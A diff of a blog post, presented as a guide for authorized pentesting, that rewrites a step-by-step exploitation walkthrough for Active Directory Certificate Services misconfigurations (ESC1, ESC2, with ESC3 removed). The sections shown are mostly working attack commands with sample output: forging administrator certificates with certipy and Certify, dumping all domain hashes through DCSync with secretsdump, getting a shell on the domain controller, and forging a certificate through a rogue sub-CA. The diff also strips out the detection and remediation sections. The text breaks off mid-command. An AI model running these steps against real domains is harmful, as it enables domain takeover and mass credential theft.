@@ -1,181 +1,251 @@
 ---
-title: "ADCS Attacks Deep Dive: ESC1 to ESC11 Complete Exploitation Guide"
-date: 2026-03-28 13:20:00 +0200
+title: "ADCS Attacks Deep Dive: ESC1 to ESC11 — Visual Exploitation Guide"
+date: 2026-03-28 13:40:00 +0200
 categories: [Security, Active Directory]
 tags: [adcs, active-directory, red-team, pentest, esc1, esc2, esc3, esc4, esc5, esc6, esc7, esc8, esc9, esc10, esc11, certificates, pki, domain-controller, exploit]
+image:
+  path: https://i.imgur.com/8XQ7zKl.png
+  alt: ADCS Attack Paths
 ---
 
-> **⚠️ Disclaimer:** This content is strictly for authorized penetration testing, red team operations, and educational purposes. All techniques must only be used in environments you own or have explicit written permission to test.
+> **For authorized penetration testing and educational purposes only.**
 
 ---
 
-## Lab Environment Reference
-
-Throughout this guide, we use the following lab setup:
+## Lab Environment
 
 ```
-Network: 192.168.10.0/24
-
-Domain: corp.local
-Domain Controller:  DC01   192.168.10.10  (Windows Server 2022)
-CA Server:          CA01   192.168.10.20  (Windows Server 2022 + ADCS)
-Member Server:      SRV01  192.168.10.30  (Windows Server 2019)
-Attacker Machine:   KALI   192.168.10.99  (Kali Linux 2024)
-Victim Workstation: WS01   192.168.10.50  (Windows 10)
+┌─────────────────────────────────────────────────────────────────┐
+│                    CORP.LOCAL — 192.168.10.0/24                  │
+│                                                                   │
+│  ┌─────────────────┐    ┌─────────────────┐    ┌─────────────┐  │
+│  │  DC01            │    │  CA01            │    │  SRV01      │  │
+│  │  192.168.10.10   │    │  192.168.10.20   │    │ 192.168.10  │  │
+│  │  Windows Server  │    │  Windows Server  │    │    .30      │  │
+│  │  2022            │    │  2022 + ADCS     │    │             │  │
+│  │  Domain Ctrl     │◄───│  Corp-CA         │    │ Member Srv  │  │
+│  └─────────────────┘    └─────────────────┘    └─────────────┘  │
+│           ▲                      ▲                                │
+│           │                      │                                │
+│  ┌─────────────────┐    ┌─────────────────┐                      │
+│  │  WS01            │    │  KALI (ATTACKER)│                      │
+│  │  192.168.10.50   │    │  192.168.10.99  │                      │
+│  │  Windows 10      │    │  Kali Linux     │                      │
+│  │  Victim WS       │    │  Attack Box     │                      │
+│  └─────────────────┘    └─────────────────┘                      │
+└─────────────────────────────────────────────────────────────────┘
 
 Domain Accounts:
-  administrator@corp.local  → Domain Admin
-  lowpriv@corp.local        → Domain User (password: Password123!)
-  victimuser@corp.local     → Domain User (password: Summer2024!)
+  administrator@corp.local  → Domain Admin (target)
+  lowpriv@corp.local        → Domain User  (attacker's foothold)
+  victimuser@corp.local     → Domain User  (used as pivot)
+  pkiadmin@corp.local       → PKI Admin    (has ManageCA)
   svcaccount@corp.local     → Service Account
-  pkiadmin@corp.local       → PKI Admin (has ManageCA)
 
-CA Name: Corp-CA
-CA FQDN: ca01.corp.local\Corp-CA
+CA Name:  Corp-CA
+CA FQDN:  ca01.corp.local\Corp-CA
 ```
 
 ---
 
-## Part 0 — Understanding ADCS from the Ground Up
+## How ADCS Authentication Works (The Big Picture)
 
-### What is ADCS and Why Should You Care?
-
-Active Directory Certificate Services (ADCS) is Microsoft's implementation of a **Public Key Infrastructure (PKI)**. It's baked into Windows Server and used in virtually every enterprise environment running Active Directory.
-
-At its core, ADCS does one thing: **it issues digital certificates**. Those certificates are then used to:
-
-- Prove identity (authentication)
-- Encrypt data (EFS, TLS, VPN)
-- Sign code and emails
-- Enable smart card login
-
-Sounds boring. But here's the attack surface: **AD trusts certificates completely and implicitly**. When Kerberos sees a certificate issued by a trusted CA, it accepts it as proof of identity — no questions asked. No password. No MFA challenge. Just a certificate.
-
-This means:
-- A certificate claiming to be `administrator@corp.local` → get a Kerberos TGT as Domain Admin
-- That certificate is valid for **1–2 years by default**
-- Even if the admin resets their password, the certificate still works
-- ADCS is almost never monitored properly
-
-### How Certificate Authentication Works (PKINIT)
+Understanding why ADCS attacks are so powerful starts with understanding **how certificates become identity**.
 
 ```
-[Attacker with Admin Certificate]
-         │
-         │  AS-REQ with Certificate (PKINIT)
-         ▼
-  [Domain Controller 192.168.10.10]
-         │
-         │  Validates: Is cert issued by trusted CA? → Yes (Corp-CA)
-         │  Extracts:  UPN from SAN → administrator@corp.local
-         │  Ignores:   Who actually requested the cert
-         │
-         │  AS-REP with TGT
-         ▼
-[Attacker now has TGT for administrator]
-         │
-         ▼
-[DCSync → All domain hashes → Complete compromise]
+┌──────────────────────────────────────────────────────────────────────┐
+│                  NORMAL KERBEROS (Password Auth)                      │
+│                                                                        │
+│  [User]──password──►[DC: AS-REQ]──validates hash──►[TGT issued]       │
+│                                                                        │
+│                  PKINIT (Certificate Auth)                             │
+│                                                                        │
+│  [User]──certificate──►[DC: AS-REQ]                                   │
+│                              │                                         │
+│                              ▼                                         │
+│                    Is cert signed by trusted CA?  ──NO──► Rejected     │
+│                              │ YES                                     │
+│                              ▼                                         │
+│                    Extract UPN from certificate SAN                    │
+│                              │                                         │
+│                              ▼                                         │
+│                    Map UPN → AD User Account                           │
+│                              │                                         │
+│                              ▼                                         │
+│                    Issue TGT as that user  ◄── ATTACKER ABUSES THIS   │
+└──────────────────────────────────────────────────────────────────────┘
 ```
 
-### Certificate Template Anatomy
-
-Every certificate is based on a **template**. Templates define:
-
-| Property | Description | Attack Relevance |
-|----------|-------------|-----------------|
-| `msPKI-Certificate-Name-Flag` | Controls SAN/subject | ESC1: `EnrolleeSuppliesSubject` |
-| `msPKI-Enrollment-Flag` | Enrollment settings | Manager approval bypass |
-| `pKIExtendedKeyUsage` | What the cert can do | Must include Client Auth |
-| `nTSecurityDescriptor` | Who can enroll | Must allow low-priv users |
-| `msPKI-RA-Signature` | Enrollment agent requirements | ESC3 |
-| `msPKI-Private-Key-Flag` | Key archival settings | ESC9 |
-
-### The Certificate Request Flow
+### The Critical Flaw
 
 ```
-1. Client generates keypair (public + private)
-2. Client creates CSR (Certificate Signing Request)
-   └── Can include requested SAN, subject, etc.
-3. Client sends CSR to CA (via RPC, HTTP, or DCOM)
-4. CA checks:
-   a. Does requester have Enroll permission on template?
-   b. Does template require manager approval?
-   c. Does CA have EDITF_ATTRIBUTESUBJECTALTNAME2 set?
-5. CA signs and issues certificate
-6. Client stores certificate + private key
+┌──────────────────────────────────────────────────────┐
+│  DC DOES NOT CHECK:                                   │
+│    ✗  Who actually requested the certificate          │
+│    ✗  Whether requester's identity matches SAN        │
+│    ✗  When the certificate was issued                 │
+│                                                       │
+│  DC ONLY CHECKS:                                      │
+│    ✓  Is the CA in NTAuthCertificates?                │
+│    ✓  Is the cert signature valid?                    │
+│    ✓  Is the cert expired?                            │
+│    ✓  UPN in SAN → map to AD account                 │
+└──────────────────────────────────────────────────────┘
 ```
 
-### Tools We'll Use
+### Certificate Template Architecture
+
+```
+Active Directory Structure
+│
+├── CN=Configuration
+│   └── CN=Services
+│       └── CN=Public Key Services
+│           ├── CN=Certificate Templates    ◄─── Template objects live here
+│           │   ├── CN=User                      Each has an ACL, flags, EKUs
+│           │   ├── CN=Machine
+│           │   ├── CN=DomainController
+│           │   └── CN=<CustomTemplates>
+│           │
+│           ├── CN=Enrollment Services     ◄─── CA objects live here
+│           │   └── CN=Corp-CA
+│           │
+│           ├── CN=NTAuthCertificates      ◄─── Trusted CA certs live here
+│           │                                   ANY cert in here = trusted for auth
+│           ├── CN=AIA                     ◄─── CA cert distribution
+│           └── CN=CDP                     ◄─── Certificate Revocation Lists
+```
+
+### What Makes a Template Exploitable
+
+```
+Template: "VulnWebTemplate"
+┌────────────────────────────────────────────────────────────┐
+│  msPKI-Certificate-Name-Flag:                               │
+│    [✓] ENROLLEE_SUPPLIES_SUBJECT  ← ESC1 FLAG              │
+│                                                             │
+│  msPKI-Enrollment-Flag:                                     │
+│    [ ] PEND_ALL_REQUESTS          ← No manager approval     │
+│                                                             │
+│  pKIExtendedKeyUsage:                                       │
+│    [✓] Client Authentication      ← Auth EKU               │
+│                                                             │
+│  nTSecurityDescriptor (ACL):                                │
+│    CORP\Domain Users: Enroll      ← Anyone can enroll!     │
+└────────────────────────────────────────────────────────────┘
+        ALL FOUR = DOMAIN ADMIN IN MINUTES
+```
+
+---
+
+## Tool Setup
 
 ```bash
-# ─── LINUX (Kali 192.168.10.99) ─────────────────────────────
+# ════════════════════════════════════════════════
+#  KALI LINUX (192.168.10.99) — Install Everything
+# ════════════════════════════════════════════════
 
 # Certipy — primary ADCS attack tool
 pip install certipy-ad
-certipy --version   # Should show 4.x+
 
-# Impacket suite
+# Impacket — DCSync, relay, auth
 pip install impacket
-# Key scripts: secretsdump.py, ntlmrelayx.py, getST.py
 
-# PetitPotam — coercion tool
+# PetitPotam — coercion
 git clone https://github.com/topotam/PetitPotam.git
-cd PetitPotam && pip install -r requirements.txt
 
-# Coercer — all coercion techniques in one
+# Coercer — all coercion methods
 pip install coercer
 
-# ─── WINDOWS (attacker workstation or foothold) ─────────────
+# Verify
+certipy --version
+python3 -c "import impacket; print('impacket ok')"
 
-# Certify.exe — enumerate templates
-# Download: https://github.com/GhostPack/Certify/releases
-
-# Rubeus.exe — Kerberos manipulation
-# Download: https://github.com/GhostPack/Rubeus/releases
-
-# Whisker — Shadow Credentials
-# Download: https://github.com/eladshamir/Whisker/releases
+# ════════════════════════════════════
+#  WINDOWS FOOTHOLD — Download Binaries
+# ════════════════════════════════════
+# Certify.exe  → https://github.com/GhostPack/Certify
+# Rubeus.exe   → https://github.com/GhostPack/Rubeus
 ```
 
 ---
 
-## ESC1 — Enrollee Supplies Subject (SAN Abuse)
+## ESC1 — Subject Alternative Name Abuse
 
-### Root Cause of Vulnerability
-
-The core issue is a **template configuration flag** called `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` stored in the `msPKI-Certificate-Name-Flag` attribute of the template object in Active Directory.
-
-When this flag is set, the CA allows the certificate requester to include any Subject Alternative Name (SAN) they want in their certificate request. The CA does **zero validation** of whether the SAN identity actually belongs to the requester. It simply trusts what the client sends.
-
-Combined with the fact that:
-1. Active Directory uses the SAN (specifically the UPN in the SAN) to determine certificate-to-identity mapping for authentication
-2. Any certificate from a trusted CA is accepted for Kerberos PKINIT
-
-...this means anyone with enrollment rights can impersonate any user in the domain, including Domain Admins.
-
-The flag was designed for web server certificates where admins legitimately need to specify custom hostnames. The problem is when the template also includes authentication EKUs.
-
-### Vulnerable Template Configuration
-
-A template is vulnerable when ALL of these are true:
+### The Vulnerability Explained
 
 ```
-msPKI-Certificate-Name-Flag    = CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x1)
-msPKI-Enrollment-Flag          = NOT CT_FLAG_PEND_ALL_REQUESTS (no manager approval)
-pKIExtendedKeyUsage            = contains Client Authentication (1.3.6.1.5.5.7.3.2)
-                                   OR Smart Card Logon (1.3.6.1.4.1.311.20.2.2)
-                                   OR PKINIT Client Auth
-                                   OR Any Purpose (2.5.29.37.0)
-nTSecurityDescriptor           = Enroll or AutoEnroll for Domain Users / Authenticated Users
+┌─────────────────────────────────────────────────────────────────┐
+│                    WHY ESC1 EXISTS                               │
+│                                                                   │
+│  LEGITIMATE USE CASE:                                             │
+│  Web admin needs cert for "webserver.corp.local" AND             │
+│  "www.corp.local" AND "internal.corp.local"                      │
+│  → Admin enables "Supply in the request" (EnrolleeSuppliesSubject)│
+│                                                                   │
+│  THE PROBLEM:                                                     │
+│  Same template also has Client Authentication EKU                 │
+│  CA doesn't verify if SAN belongs to the requester               │
+│  Anyone can put ANYONE's UPN in the SAN                          │
+│                                                                   │
+│  RESULT:                                                          │
+│  lowpriv requests cert with SAN = administrator@corp.local        │
+│  CA says "OK here's your cert for administrator"                  │
+│  DC says "cert from trusted CA? SAN = admin? Here's your TGT"    │
+└─────────────────────────────────────────────────────────────────┘
+```
+
+### Attack Flow Diagram
+
+```
+[lowpriv@corp.local] ──────────────────────────────────────────────►
+        │                                                            │
+        │  Step 1: Enumerate                                         │
+        ▼                                                            │
+[certipy find --vulnerable]                                          │
+        │                                                            │
+        │  Finds: VulnWebTemplate                                    │
+        │    - EnrolleeSuppliesSubject = TRUE                        │
+        │    - Client Authentication EKU                             │
+        │    - Domain Users can Enroll                               │
+        │    - No Manager Approval                                   │
+        │                                                            │
+        │  Step 2: Request cert with fake SAN                        │
+        ▼                                                            │
+[certipy req -upn administrator@corp.local]                          │
+        │                                                            │
+        │  CSR sent to CA01 (192.168.10.20)                          │
+        │  Contains: SAN = administrator@corp.local                  │
+        │  CA checks: Does lowpriv have Enroll right? YES            │
+        │  CA does NOT check: Is SAN = requester? IGNORED            │
+        │                                                            │
+        ▼                                                            │
+[CA01 issues cert with SAN=administrator@corp.local] ──────────────►│
+        │                                                            │
+        │  Step 3: Authenticate with cert                            │
+        ▼                                                            │
+[certipy auth -pfx administrator.pfx]                                │
+        │                                                            │
+        │  AS-REQ (PKINIT) sent to DC01 (192.168.10.10)             │
+        │  DC sees: cert from Corp-CA (trusted) + SAN=administrator  │
+        │  DC issues TGT for administrator                           │
+        │  DC also returns NTLM hash via U2U                         │
+        │                                                            │
+        ▼                                                            │
+[TGT + NTLM hash for administrator]                                  │
+        │                                                            │
+        │  Step 4: DCSync                                            │
+        ▼                                                            │
+[secretsdump → ALL domain hashes] ─────────────────────────────────►│
+                                                              GAME OVER
 ```
 
 ### Step-by-Step Exploitation
 
-#### Step 1: Enumerate Vulnerable Templates
+**Step 1 — Enumerate vulnerable templates**
 
 ```bash
-# From Kali (192.168.10.99) as lowpriv user
+# From Kali (192.168.10.99)
 certipy find \
   -u lowpriv@corp.local \
   -p 'Password123!' \
@@ -183,55 +253,42 @@ certipy find \
   -vulnerable \
   -stdout
 
-# Sample output showing ESC1:
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # Certificate Templates
-#   Template Name              : VulnWebTemplate
-#   Display Name               : Vulnerable Web Template
-#   Certificate Authorities    : Corp-CA
-#   Enabled                    : True
-#   Client Authentication      : True        ← Auth EKU present
-#   Enrollment Agent           : False
-#   Any Purpose                : False
-#   Enrollee Supplies Subject  : True         ← THE VULNERABLE FLAG
-#   Certificate Name Flags     : EnrolleeSuppliesSubject
-#   Enrollment Flags           : None
-#   Extended Key Usage         : Client Authentication
-#   Requires Manager Approval  : False        ← No approval needed
-#   Permissions
-#     Enrollment Permissions
-#       Enrollment Rights      : CORP.LOCAL\Domain Users    ← Any user!
+#   0
+#     Template Name              : VulnWebTemplate
+#     Display Name               : Vulnerable Web Template
+#     Certificate Authorities    : Corp-CA
+#     Enabled                    : True
+#     Client Authentication      : True         ← Must be TRUE
+#     Enrollment Agent           : False
+#     Any Purpose                : False
+#     Enrollee Supplies Subject  : True          ← THE DANGEROUS FLAG
+#     Certificate Name Flags     : EnrolleeSuppliesSubject
+#     Enrollment Flags           : None
+#     Extended Key Usage         : Client Authentication
+#     Requires Manager Approval  : False         ← Must be FALSE
+#     Permissions
+#       Enrollment Rights        : CORP.LOCAL\Domain Users  ← Must include us
 ```
 
 ```powershell
-# Alternatively from Windows foothold
+# Windows (from foothold on WS01 192.168.10.50)
 .\Certify.exe find /vulnerable
 
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # [!] Vulnerable Certificates Templates :
 #     CA Name           : ca01.corp.local\Corp-CA
 #     Template Name     : VulnWebTemplate
-#     Schema Version    : 2
-#     Validity Period   : 1 year
-#     Renewal Period    : 6 weeks
-#     msPKI-Certificates-Name-Flag    : ENROLLEE_SUPPLIES_SUBJECT
-#     mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS PUBLISH_TO_DS
-#     Authorized Signatures Required  : 0
-#     Application Policies            :
-#     pkiextendedkeyusage             : Client Authentication
-#     mspki-certificate-application-policy : Client Authentication
-#     Permissions
-#       Enrollment Permissions
-#         Enrollment Rights           : CORP\Domain Users     S-1-5-21-...
-#       Object Control Permissions
-#         Owner                       : CORP\Administrator    S-1-5-21-...
-#         WriteOwner Principals       : CORP\Administrator    S-1-5-21-...
-#         WriteDacl Principals        : CORP\Administrator    S-1-5-21-...
-#         WriteProperty Principals    : CORP\Administrator    S-1-5-21-...
+#     Enrollee Supplies Subject  : True
+#     Client Authentication      : True
+#     Enrollment Rights          : CORP\Domain Users
 ```
 
-#### Step 2: Request Certificate with Admin SAN
+**Step 2 — Request certificate as administrator**
 
 ```bash
-# From Kali — request a certificate claiming to be administrator
+# Kali — request cert claiming to be administrator
 certipy req \
   -u lowpriv@corp.local \
   -p 'Password123!' \
@@ -241,7 +298,7 @@ certipy req \
   -target ca01.corp.local \
   -dc-ip 192.168.10.10
 
-# Output:
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # [*] Requesting certificate via RPC
 # [*] Successfully requested certificate
 # [*] Request ID is 23
@@ -251,85 +308,68 @@ certipy req \
 ```
 
 ```powershell
-# Windows — Certify
+# Windows — Certify request
 .\Certify.exe request /ca:ca01.corp.local\Corp-CA /template:VulnWebTemplate /altname:administrator
 
-# [*] Action: Request a Certificates
-# [*] Current user context    : CORP\lowpriv
-# [*] No subject name specified, using current context as subject.
-# [*] Template                : VulnWebTemplate
-# [*] Subject                 : CN=lowpriv, CN=Users, DC=corp, DC=local
-# [*] AltName                 : administrator
-# [*] Certificate Authority   : ca01.corp.local\Corp-CA
-# [*] CA Response             : The certificate had been issued.
-# [*] Request ID              : 23
-# [*] cert.pem                :
-# -----BEGIN RSA PRIVATE KEY-----
-# ...
-# -----END CERTIFICATE-----
-
-# Convert PEM to PFX (run on Kali or use openssl on Windows)
-openssl pkcs12 \
-  -in cert.pem \
-  -keyex \
-  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
-  -export \
-  -out admin.pfx \
-  -passout pass:''
+# Then convert PEM → PFX
+openssl pkcs12 -in cert.pem -keyex `
+  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" `
+  -export -out admin.pfx -passout pass:''
 ```
 
-#### Step 3: Authenticate and Get NTLM Hash (Linux)
+**Step 3 — Authenticate with the certificate (Linux)**
 
 ```bash
-# Use certificate for PKINIT — get TGT and NTLM hash
+# PKINIT authentication → TGT + NTLM hash
 certipy auth \
   -pfx administrator.pfx \
   -dc-ip 192.168.10.10
 
-# Output:
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # [*] Using principal: administrator@corp.local
 # [*] Trying to get TGT...
 # [*] Got TGT
 # [*] Saved credential cache to 'administrator.ccache'
 # [*] Trying to retrieve NT hash for 'administrator'
-# [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
+# [*] Got hash for 'administrator@corp.local':
+#     aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
 ```
 
-#### Step 4: Use Hash for Full Domain Compromise
+**Step 4 — DCSync all domain hashes**
 
 ```bash
-# Option A: DCSync — dump all domain hashes
+# Option A: DCSync directly
 python3 secretsdump.py \
   -hashes 'aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' \
   'corp.local/administrator@192.168.10.10'
 
-# Output:
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 # [*] Using the DRSUAPI method to get NTDS.DIT secrets
 # Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
 # krbtgt:502:aad3b435b51404eeaad3b435b51404ee:19e9b6b62bd6e15f3a5bcf1c6f3e4d2a:::
-# ...all user hashes...
+# lowpriv:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+# [... all users ...]
 
-# Option B: Pass-the-Hash to DC
+# Option B: Shell on DC01
 python3 wmiexec.py \
   -hashes ':58a478135a93ac3bf058a5ea0e8fdb71' \
   'corp.local/administrator@192.168.10.10'
 
-# Option C: Golden Ticket using krbtgt hash
-python3 ticketer.py \
-  -nthash 19e9b6b62bd6e15f3a5bcf1c6f3e4d2a \
-  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
-  -domain corp.local \
-  administrator
-
-export KRB5CCNAME=administrator.ccache
-python3 psexec.py -k -no-pass corp.local/administrator@dc01.corp.local
+# ══ OUTPUT ══════════════════════════════════════════════════════
+# Impacket v0.12.0 - Copyright 2023 Fortra
+# [*] SMBv3.0 dialect used
+# [!] Launching semi-interactive shell - Careful what you execute
+# C:\Windows\system32>whoami
+# corp\administrator
+# C:\Windows\system32>hostname
+# DC01
 ```
 
-#### Step 5: Pass-the-Certificate (Windows)
+**Step 5 — Pass-the-Certificate on Windows**
 
 ```powershell
-# On Windows foothold — inject TGT directly
+# Inject TGT directly into current session — no password needed
 .\Rubeus.exe asktgt \
   /user:administrator \
   /certificate:admin.pfx \
@@ -338,192 +378,82 @@ python3 psexec.py -k -no-pass corp.local/administrator@dc01.corp.local
   /dc:192.168.10.10 \
   /ptt
 
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # [*] Action: Ask TGT
-# [*] Using PKINIT with etype rc4_hmac and subject: CN=lowpriv
+# [*] Using PKINIT with etype rc4_hmac
 # [*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\administrator'
 # [+] TGT request successful!
-# [*] base64(ticket.kirbi):
-#      doIFuj ... [base64 TGT]
 # [+] Ticket successfully imported!
 
-# Now we have admin TGT in memory
 klist
+# Current LogonId is 0:0x62d3f
+# Cached Tickets: (1)
+#   #0>  Client: administrator @ CORP.LOCAL
+#        Server: krbtgt/CORP.LOCAL @ CORP.LOCAL
+#        End Time: 3/29/2026 0:00:00
 
-# Access DC
-dir \\dc01.corp.local\c$
-# Volume in drive \\dc01.corp.local\c$ is ...
-
-# Run commands on DC
-.\PsExec.exe \\dc01.corp.local cmd
-```
-
-### Detection Indicators
-
-- **Event ID 4886** on CA01: Certificate request received — SAN contains a different user than the requester
-- **Event ID 4887** on CA01: Certificate issued — cross-reference `Requester` vs SAN UPN
-- **Event ID 4768** on DC01: TGT request using PKINIT from unexpected user
-- Unusual PKINIT auth (most users use password auth, not certificates)
-- Certificate Subject ≠ Certificate SAN
-
-### Remediation Steps
-
-```powershell
-# On CA01 — Disable EnrolleeSuppliesSubject on the template
-# Open Certificate Templates console: certtmpl.msc
-# Right-click VulnWebTemplate → Properties → Subject Name tab
-# Change "Supply in the request" to "Build from Active Directory"
-
-# Or via PowerShell/ADSI
-$template = [ADSI]"LDAP://CN=VulnWebTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
-# Get current flags
-$flags = $template.Properties["msPKI-Certificate-Name-Flag"].Value
-# Remove bit 1 (EnrolleeSuppliesSubject = 0x1)
-$newflags = $flags -band (-bnot 0x1)
-$template.Properties["msPKI-Certificate-Name-Flag"].Value = $newflags
-$template.CommitChanges()
-
-# If SAN is legitimately needed, enable Manager Approval:
-# certtmpl.msc → Template Properties → Issuance Requirements → CA certificate manager approval
+# Access DC share
+dir \\192.168.10.10\c$
+# Volume in drive \\192.168.10.10\c$ is Windows
+# 03/28/2026  12:00    <DIR>  inetpub
+# 03/28/2026  12:00    <DIR>  PerfLogs
+# [...]
 ```
 
 ---
 
 ## ESC2 — Any Purpose / No EKU
 
-### Root Cause of Vulnerability
+### The Vulnerability Explained
 
-The `Extended Key Usage` (EKU) field in a certificate restricts what the certificate can be used for. Common EKUs include:
+```
+┌────────────────────────────────────────────────────────────────┐
+│              EKU (Extended Key Usage) Explained                 │
+│                                                                  │
+│  EKU = "what is this certificate allowed to do?"                │
+│                                                                  │
+│  1.3.6.1.5.5.7.3.1  → Server Authentication (TLS)              │
+│  1.3.6.1.5.5.7.3.2  → Client Authentication  ← needed for auth │
+│  1.3.6.1.4.1.311.20.2.1 → Enrollment Agent   ← ESC3 power      │
+│  2.5.29.37.0         → ANY PURPOSE            ← dangerous       │
+│  (empty)             → NO RESTRICTION         ← also dangerous  │
+│                                                                  │
+│  X.509 STANDARD RULE:                                           │
+│    Empty EKU = Certificate can be used for ANYTHING             │
+│    Any Purpose = Same result                                     │
+│                                                                  │
+│  WINDOWS BEHAVIOR:                                              │
+│    Any Purpose cert → usable for Client Authentication          │
+│    Any Purpose cert → usable as Enrollment Agent cert           │
+│    No EKU cert      → can act as SubCA (sign other certs!)      │
+└────────────────────────────────────────────────────────────────┘
+```
 
-- `1.3.6.1.5.5.7.3.1` — Server Authentication
-- `1.3.6.1.5.5.7.3.2` — Client Authentication
-- `1.3.6.1.5.5.7.3.3` — Code Signing
-- `2.5.29.37.0`        — **Any Purpose** (no restriction)
+### Attack Paths from ESC2
 
-When a template has **no EKU** (empty field) or **Any Purpose**, the resulting certificate is treated by Windows as:
-1. Valid for **client authentication** — can be used for PKINIT/Kerberos even without Client Auth EKU
-2. Valid as an **enrollment agent** certificate — can be used to request certs on behalf of others (ESC3 pivot)
-3. Valid as a **subordinate CA** certificate — can sign other certificates
-
-This is because Windows follows X.509 standard: absence of EKU = unrestricted use.
+```
+        ESC2 Certificate Obtained
+               │
+        ┌──────┴──────────────────────┐
+        │                             │
+        ▼                             ▼
+   Path A:                       Path B:
+   Direct Auth                   Use as Enrollment Agent
+   (Client Auth EKU               → ESC3 Attack Chain
+    implied by Any Purpose)       → Request cert for any user
+        │                             │
+        ▼                             ▼
+   certipy auth                  certipy req --on-behalf-of
+   → TGT for yourself            → TGT for Domain Admin
+        │                             │
+        └──────────┬──────────────────┘
+                   ▼
+              Domain Admin
+```
 
 ### Step-by-Step Exploitation
 
-#### Step 1: Identify Any Purpose / No EKU Templates
-
-```bash
-certipy find \
-  -u lowpriv@corp.local \
-  -p 'Password123!' \
-  -dc-ip 192.168.10.10 \
-  -vulnerable \
-  -stdout
-
-# Look for:
-#   Any Purpose           : True
-# OR
-#   Extended Key Usage    : (empty / none listed)
-#   Application Policies  : (empty)
-```
-
-#### Step 2: Request the Certificate
-
-```bash
-# Request the Any Purpose cert as yourself
-certipy req \
-  -u lowpriv@corp.local \
-  -p 'Password123!' \
-  -ca 'Corp-CA' \
-  -template 'AnyPurposeTemplate' \
-  -dc-ip 192.168.10.10
-
-# Saved to: lowpriv.pfx
-```
-
-#### Step 3a: Use for Direct Authentication
-
-```bash
-# Even though Client Authentication is not listed, Any Purpose allows it
-certipy auth \
-  -pfx lowpriv.pfx \
-  -dc-ip 192.168.10.10 \
-  -username lowpriv \
-  -domain corp.local
-
-# This gives you TGT + hash for lowpriv — useful for persistence
-```
-
-#### Step 3b: Pivot to ESC3 — Use as Enrollment Agent
-
-```bash
-# Use the Any Purpose cert as enrollment agent
-# Request a cert ON BEHALF OF administrator
-certipy req \
-  -u lowpriv@corp.local \
-  -p 'Password123!' \
-  -ca 'Corp-CA' \
-  -template 'User' \
-  -on-behalf-of 'corp\administrator' \
-  -pfx lowpriv.pfx \
-  -dc-ip 192.168.10.10
-
-# Output: administrator.pfx
-
-certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
-# → NT hash for administrator → DCSync
-```
-
-#### Step 3c: Use as Rogue Sub-CA (No EKU only)
-
-```bash
-# If template has no EKU, the cert can act as SubCA
-# Forge a certificate signed by our Any Purpose cert
-
-# Generate target cert
-openssl req -newkey rsa:2048 -keyout admin_forged.key -out admin_forged.csr -nodes \
-  -subj "/CN=administrator"
-
-# Sign it with our Any Purpose cert (acting as sub-CA)
-openssl x509 -req -in admin_forged.csr \
-  -CA lowpriv.crt -CAkey lowpriv.key \
-  -CAcreateserial -out admin_forged.crt -days 365 \
-  -extfile <(printf "[ext]\nsubjectAltName=otherName:1.3.6.1.4.1.311.20.2.3;UTF8:administrator@corp.local")
-
-# Combine into PFX
-openssl pkcs12 -export -in admin_forged.crt -inkey admin_forged.key -out forged_admin.pfx -passout pass:''
-```
-
-### Detection & Remediation
-
-```powershell
-# Detection: Audit templates with Any Purpose or no EKU
-Get-CATemplate | Where-Object { $_.pKIExtendedKeyUsage -eq $null -or $_.pKIExtendedKeyUsage -contains "2.5.29.37.0" }
-
-# Remediation: Remove Any Purpose EKU, specify only what's needed
-# certtmpl.msc → Template → Extensions → Application Policies
-# Remove "Any Purpose", add specific required EKUs only
-```
-
----
-
-## ESC3 — Enrollment Agent Certificate Abuse
-
-### Root Cause of Vulnerability
-
-The **Certificate Request Agent** functionality allows designated users (enrollment agents) to request certificates **on behalf of** other users. This is a legitimate feature used by helpdesk staff to issue smart cards for users.
-
-The EKU that grants this power is: `1.3.6.1.4.1.311.20.2.1` (Certificate Request Agent)
-
-**Two conditions** must exist simultaneously:
-1. **ESC3-1**: A template exists that grants low-privileged users the Certificate Request Agent EKU (enrollment agent cert)
-2. **ESC3-2**: Another template exists with Client Authentication EKU where enrollment agents aren't restricted to specific principals
-
-When both exist, the attack chain is: get enrollment agent cert → use it to request User template cert for Domain Admin → authenticate as DA.
-
-The CA has a feature called **Enrollment Agent Restrictions** that limits which templates enrollment agents can use and which subjects they can request on behalf of. When this is not configured, enrollment agents have no restrictions.
-
-### Step-by-Step Exploitation
-
-#### Step 1: Find Enrollment Agent Templates (ESC3-1)
+**Step 1 — Find the Any Purpose template**
 
 ```bash
 certipy find \
@@ -533,12 +463,167 @@ certipy find \
   -vulnerable
 
 # Look for:
-#   Enrollment Agent      : True
-#   Requires Manager Approval : False
-#   Enrollment Rights     : Domain Users
+# Any Purpose           : True
+# OR
+# Extended Key Usage    : (empty)
 ```
 
-#### Step 2: Obtain Enrollment Agent Certificate
+**Step 2 — Request the certificate**
+
+```bash
+certipy req \
+  -u lowpriv@corp.local \
+  -p 'Password123!' \
+  -ca 'Corp-CA' \
+  -template 'AnyPurposeTemplate' \
+  -dc-ip 192.168.10.10
+
+# Saved to: lowpriv.pfx (Any Purpose EKU)
+```
+
+**Step 3a — Authenticate directly (Any Purpose → Client Auth)**
+
+```bash
+certipy auth \
+  -pfx lowpriv.pfx \
